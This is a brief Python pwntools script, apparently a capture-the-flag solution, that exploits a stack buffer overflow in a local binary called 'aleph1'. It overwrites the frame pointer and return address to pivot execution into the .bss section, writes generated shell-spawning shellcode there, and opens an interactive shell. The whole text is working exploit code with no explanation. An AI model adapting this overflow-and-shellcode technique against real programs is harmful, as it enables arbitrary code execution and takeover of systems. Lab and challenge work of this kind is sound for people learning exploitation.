from pwn import*
import pwnlib
context(os='linux', arch='amd64', log_level='debug')
e=ELF("./aleph1")
fgets_plt=e.plt['fgets']
bss_addr = e.bss()
shellcode=asm(shellcraft.sh())
shellcode+='A'*984
shellcode+=p64(bss_addr)
payload='a'*1024+p64(bss_addr+0x400)+p64(0x4005D5)
s=process("./aleph1")
s.sendline(payload)
#pwnlib.gdb.attach(s)
s.sendline(shellcode)
s.interactive()
